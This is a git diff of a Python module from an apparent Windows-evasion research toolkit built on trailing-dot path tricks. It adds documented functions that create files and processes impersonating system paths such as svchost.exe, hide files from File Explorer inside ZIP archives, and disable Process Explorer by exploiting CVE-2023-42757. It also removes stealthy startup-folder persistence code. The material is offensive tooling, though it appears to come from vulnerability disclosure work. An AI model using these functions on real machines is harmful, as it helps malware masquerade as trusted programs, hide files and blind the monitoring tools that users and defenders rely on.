@@ -2,76 +2,190 @@ import tempfile
 import os
 import shutil
 import zipfile
-from pathlib import Path
+import uuid
 from ctypes.wintypes import HANDLE
 
-from magic_dot.nt_create_user_process.nt_create_user_process import nt_create_user_process, PROCESS_CREATE_FLAGS_CREATE_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
-from magic_dot.reparse_points.reparse_points import create_ntfs_symlink
+from magic_dot.nt_create_user_process.nt_create_user_process import nt_create_user_process
 from magic_dot.file_utils import nt_path, nt_makedirs, set_short_name, get_short_name, dos_path
 
-WINDOWS_AUTOSTART_PATH_IN_USER_HOME = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-USER_HOME_PATH = str(Path.home())
-AUTOSTART_PATH = os.path.join(USER_HOME_PATH, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)
-
-INOPERABLE_NAME = "..."
-
-STARTUP_BAT_PROXY_SCRIPT_CONTENT = r"""
-@echo off
-
-for %%a in (*.exe) do (
-  start %%a
-)
-"""
+DOTS_FILE_NAME = "..."
 
 
-def generate_impersonated_path(path: str, near: bool) -> str:
+def generate_impersonated_path(target_path: str, near: bool) -> str:
+    r"""
+    Generates a path that impersonates another path. Once the generated path is referenced
+    by a DOS path, and converted by Windows to an NT path, it references a different chosen path.
+    For example, if the desired path to impersonate to is "C:\Windows\System32\svchost.exe", then
+    the generated path is "\??\C:\Windows.\System32\svchost.exe". If the generated path is
+    referenced by a DOS path, then as part of the DOS-to-NT conversion process in Windows, the
+    trailing dot from "Windows." is removed, resulting the path "C:\Windows\System32\svchost.exe".
+
+    :param target_path: The path to impersonate to
+    :param near: Should the resulted path be in the same folder of "target_path"
+    :return: The generated path, as an NT path
+    """
     impersonated_path = ""
     if near:
-        impersonated_path = f"{path}."
+        impersonated_path = f"{target_path}."
     else:
-        target_file_path_split = path.split("\\")
+        target_file_path_split = target_path.split("\\")
         top_level_directory = os.path.join(f"{target_file_path_split[0]}\\", target_file_path_split[1])
         under_top_level_directory = os.path.join(*target_file_path_split[2:])
         impersonated_path = os.path.join(f"{top_level_directory}.", under_top_level_directory)
-    
+
     return nt_path(impersonated_path)
 
+
 def generate_inoperable_path(parent_dir_path: str):
+    """
+    Generates a path that is inoperable. Once the generated path is referenced
+    by a DOS path, and converted by Windows to an NT path, it references a non-existent
+    path.
+
+    :param parent_dir_path: The parent path of the resulted generated path
+    :return: The generated inoperable path, as an NT path.
+    """
+    target_path = os.path.join(parent_dir_path, str(uuid.uuid4()))
+    return generate_impersonated_path(target_path, near=True)
+
+
+def generate_dots_path(parent_dir_path: str):
+    r"""
+    Generates a path with a last path element made only from dots. If this path is
+    referenced with a DOS path, then the last path element will always be removed
+    as part of Windows' DOS-to-NT path conversion process, eventually referencing
+    the parent directory of the path. These paths will usually create many issues
+    when referenced with DOS paths by normal software.
+
+    :param parent_dir_path: The parent path of the resulted generated path
+    :return: The generated path, as an NT path
+    """
     parent_dir_abs_path = os.path.abspath(parent_dir_path)
-    inoperable_path = nt_path(os.path.join(parent_dir_abs_path, INOPERABLE_NAME))
-    
-    while os.path.exists(inoperable_path):
-        inoperable_path += "."
+    dots_path = nt_path(os.path.join(parent_dir_abs_path, DOTS_FILE_NAME))
 
-    return inoperable_path
+    while os.path.exists(dots_path):
+        dots_path += "."
 
-def create_inoperable_file(parent_dir_path: str, copy_from: str = None) -> str:
-    inoperable_file_path = generate_inoperable_path(parent_dir_path)
+    return dots_path
 
-    if copy_from != None:
+
+def create_magic_dot_file(file_path: str, copy_from: str = None):
+    """
+    Creates a file in given path even its path has trailing dots or spaces
+    in some of its path elements
+
+    :param file_path: The path to the file to create.
+    :param copy_from: A path to a file with the content to write into the new file, defaults to None
+    """
+    if copy_from is not None:
         copy_from_abs_path = os.path.abspath(copy_from)
-        shutil.copyfile(copy_from_abs_path, inoperable_file_path)
+        shutil.copyfile(copy_from_abs_path, nt_path(file_path))
     else:
-        open(inoperable_file_path, "wb").close()
-
-    return inoperable_file_path
+        open(nt_path(file_path), "wb").close()
 
 
-def create_inoperable_dir(parent_dir_path: str, copy_from: str = None):
-    inoperable_dir_path = generate_inoperable_path(parent_dir_path)
+def create_magic_dot_dir(dir_path: str, copy_from: str = None):
+    """
+    Creates a directory in given path even its path has trailing dots or spaces
+    in some of its path elements
 
+    :param dir_path: The path to the directory to create.
+    :param copy_from: A path to a directory with the content to write into the new directory,
+                        defaults to None
+    """
     if copy_from:
         copy_from_abs_path = os.path.abspath(copy_from)
-        shutil.copytree(copy_from_abs_path, inoperable_dir_path)
+        shutil.copytree(copy_from_abs_path, nt_path(dir_path))
     else:
-        os.mkdir(inoperable_dir_path)
-
-    return inoperable_dir_path
+        os.mkdir(nt_path(dir_path))
 
 
-def create_impersonated_file(target_file: str, copy_from: str = None, near: bool = False, use_existing_short_name: bool = False, use_specific_short_name: str = None) -> str:
+def create_inoperable_file(parent_dir_path: str, copy_from: str = None) -> str:
+    """
+    Creates an inoperable file. Read generate_inoperable_path's docstring.
+
+    :param parent_dir_path: The directory to create the file in
+    :param copy_from: A path to a file with the content to write into the new file, defaults to None
+    :return: The path to the new file, as an NT path
+    """
+    dots_file_path = generate_inoperable_path(parent_dir_path)
+    create_magic_dot_file(dots_file_path, copy_from)
+
+    return dots_file_path
+
+
+def create_inoperable_dir(parent_dir_path: str, copy_from: str = None) -> str:
+    """
+    Creates an inoperable directory. Read generate_inoperable_path's docstring.
+
+    :param parent_dir_path: The directory to create the directory in
+    :param copy_from: A path to a directory with the content to write into the new directory,
+                        defaults to None
+    :return: The path to the new directory, as an NT path
+    """
+    dots_file_path = generate_inoperable_path(parent_dir_path)
+    create_magic_dot_dir(dots_file_path, copy_from)
+
+    return dots_file_path
+
+
+def create_dots_file(parent_dir_path: str, copy_from: str = None) -> str:
+    """
+    Creates a file with a name made only from dots.
+
+    :param parent_dir_path: The directory to create the file in
+    :param copy_from: A path to a file with the content to write into the new file, defaults to None
+    :return: The path to the new file, as an NT path
+    """
+    dots_file_path = generate_dots_path(parent_dir_path)
+    create_magic_dot_file(dots_file_path, copy_from)
+
+    return dots_file_path
+
+
+def create_dots_dir(parent_dir_path: str, copy_from: str = None):
+    """
+    Creates a directory with a name made only from dots.
+
+    :param parent_dir_path: The directory to create the directory in
+    :param copy_from: A path to a directory with the content to write into the new directory,
+                        defaults to None
+    :return: The path to the new directory, as an NT path
+    """
+    dots_dir_path = generate_dots_path(parent_dir_path)
+    create_magic_dot_dir(dots_dir_path, copy_from)
+
+    return dots_dir_path
+
+
+def create_impersonated_file(
+    target_file: str,
+    copy_from: str = None,
+    near: bool = False,
+    use_existing_short_name: bool = False,
+    use_specific_short_name: str = None,
+) -> str:
+    """
+    Read generate_impersonated_path's docstring.
+    Creates a file that impersonates a different file on the filesystem. Basically, creates
+    a file in a path generated by the generate_impersonated_path() function. In addition, 
+    it's possible to choose that the generated file will impersonate the short name of the
+    target file. Impersonating the short name of the target file can be done in two ways:
+    1. Impersonate the existing short name of the target file
+    2. Set a short name for the target file and impersonate its path
+
+    :param target_file: The target file to impersonate to
+    :param copy_from: A path to a file with the content to write into the new file
+    :param near: Should the resulted path be in the same folder of "target_file", defaults to False
+    :param use_existing_short_name: Should the file impersonate the path for the short name of
+                                    "target_file", defaults to False
+    :param use_specific_short_name: A short name to set for the target file, leading the resulted 
+                                    file to impersonate it, instead of the normal name, defaults to
+                                    None
+    :return: The path the new file, as an NT path
+    """
     target_file_abs_path = os.path.abspath(target_file)
-    
+
     if use_specific_short_name != None:
         set_short_name(target_file_abs_path, use_specific_short_name)
 
@@ -81,16 +195,38 @@ def create_impersonated_file(target_file: str, copy_from: str = None, near: bool
     impersonated_file_path = generate_impersonated_path(target_file_abs_path, near)
     nt_makedirs(os.path.dirname(impersonated_file_path))
 
-    if copy_from:
-        copy_from_abs_path = os.path.abspath(copy_from)
-        shutil.copyfile(copy_from_abs_path, impersonated_file_path)
-    else:
-        open(impersonated_file_path, "wb").close()
-    
+    create_magic_dot_file(impersonated_file_path, copy_from)
+
     return impersonated_file_path
 
-    
-def create_impersonated_dir(target_dir: str, copy_from: str = None, near: bool = False, use_existing_short_name: bool = False, use_specific_short_name: str = None) -> str:
+
+def create_impersonated_dir(
+    target_dir: str,
+    copy_from: str = None,
+    near: bool = False,
+    use_existing_short_name: bool = False,
+    use_specific_short_name: str = None,
+) -> str:
+    """
+    Read generate_impersonated_path's docstring.
+    Creates a directory that impersonates a different directory on the filesystem.
+    Basically, creates a directory in a path generated by the generate_impersonated_path()
+    function. In addition, it's possible to choose that the generated directory will
+    impersonate the short name of the target directory. Impersonating the short name of the
+    target directory can be done in two ways:
+    1. Impersonate the existing short name of the target directory
+    2. Set a short name for the target directory and impersonate its path
+
+    :param target_dir: The target directory to impersonate to
+    :param copy_from: A path to a directory with the content to write into the new directory
+    :param near: Should the resulted path be in the same folder of "target_dir", defaults to False
+    :param use_existing_short_name: Should the directory impersonate the path for the short name of
+                                    "target_dir", defaults to False
+    :param use_specific_short_name: A short name to set for the target directory, leading the
+                                    resulted directory to impersonate it, instead of the normal
+                                    name, defaults to None
+    :return: The path the new directory, as an NT path
+"""
     target_dir_abs_path = os.path.abspath(target_dir)
 
     if use_specific_short_name != None:
@@ -102,21 +238,33 @@ def create_impersonated_dir(target_dir: str, copy_from: str = None, near: bool =
     impersonated_dir_path = generate_impersonated_path(target_dir_abs_path, near)
     nt_makedirs(os.path.dirname(impersonated_dir_path))
 
-    if copy_from:
-        copy_from_abs_path = os.path.abspath(copy_from)
-        shutil.copytree(copy_from_abs_path, impersonated_dir_path)
-    else:
-        os.mkdir(impersonated_dir_path)
+    create_magic_dot_dir(impersonated_dir_path, copy_from)
 
     return impersonated_dir_path
 
 
 def create_impersonated_process(impersonate_to_path: str, exe_path: str) -> HANDLE:
+    """
+    Runs an executable from a path that impersonates a path.
+    Read generate_impersonated_path's docstring.
+
+    :param impersonate_to_path: The path to impersonate to
+    :param exe_path: The path for the executable to run
+    :return: A handle to the running process, after it was run
+    """
     impersonated_file_path = create_impersonated_file(impersonate_to_path, exe_path, False)
     return nt_create_user_process(impersonated_file_path, os.path.abspath(dos_path(impersonate_to_path)))
 
 
 def add_invisible_file_to_zip(zip_file_path: str, file_path: str):
+    """
+    Adds a file to a ZIP archive in a way that File Explorer does not
+    present it to users that list or extract the archive. This is done
+    by creating a folder
+
+    :param zip_file_path: The path to the ZIP archive to add the file into
+    :param file_path: The path to the file to add into the ZIP archive
+    """
     zip_file_abs_path = os.path.abspath(zip_file_path)
     file_abs_path = os.path.abspath(file_path)
     with zipfile.ZipFile(zip_file_abs_path, "a") as zip:
@@ -124,58 +272,13 @@ def add_invisible_file_to_zip(zip_file_path: str, file_path: str):
 
 
 def disable_procexp():
+    """
+    Exploits CVE-2023-42757. Runs a process with a name that leads
+    Process explorer to close and to be unable to run again as longs
+    as this process is running.
+    """
     temp_path = tempfile.gettempdir()
     disabling_process_path = os.path.join(temp_path, "a" * 255)
     cmd_exe_path = os.path.expandvars(r"%systemroot%\System32\cmd.exe")
     shutil.copyfile(cmd_exe_path, nt_path(disabling_process_path))
     nt_create_user_process(disabling_process_path, hide_console_window=True)
-
-
-# def is_untraceable_startup_folder(folder_path: str):
-#     for file_name in os.listdir(folder_path):
-#         file_path = os.path.join(folder_path, file_name)
-#         try:
-#             with open(file_path, "r") as f:
-#                 bat_file_content = f.read()
-#         except UnicodeDecodeError:
-#             # means it's not a textual file (like the BAT file we are looking for)
-#             continue
-#         if bat_file_content == STARTUP_BAT_PROXY_SCRIPT:
-#             return True
-    
-#     return False
-
-
-def create_misleading_autostart_link(target_file_path: str, autostart_file_name: str):
-    # Requires the "Create Symbolic Links" user right or "Developer Mode" enabled
-    home = str(Path.home())
-    autostart_path = os.path.join(home, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)
-
-    symlink_to_target_name = f"{autostart_file_name}."
-    symlink_to_target_path = os.path.join(autostart_path, symlink_to_target_name)
-    symlink_to_symlink_name = autostart_file_name
-
-    create_ntfs_symlink(nt_path(symlink_to_target_path), target_file_path)
-
-    backup_cwd = os.getcwd()
-    os.chdir(autostart_path)
-    create_ntfs_symlink(symlink_to_symlink_name, symlink_to_target_name, relative=True)
-    os.chdir(backup_cwd)
-
-
-def create_untraceable_startup_folder(folder_path: str, proxy_bat_file_name: str):
-    if not os.path.exists(folder_path):
-        os.makedirs(folder_path)
-
-    proxy_bat_file_name_no_ext = Path(proxy_bat_file_name).stem
-    proxy_bat_file_path = os.path.join(folder_path, proxy_bat_file_name_no_ext)
-    with open(proxy_bat_file_path, "w") as f:
-        f.write(STARTUP_BAT_PROXY_SCRIPT_CONTENT)
-    
-    create_misleading_autostart_link(proxy_bat_file_path, f"{proxy_bat_file_name_no_ext}.bat")
-
-    
-
-
-
-
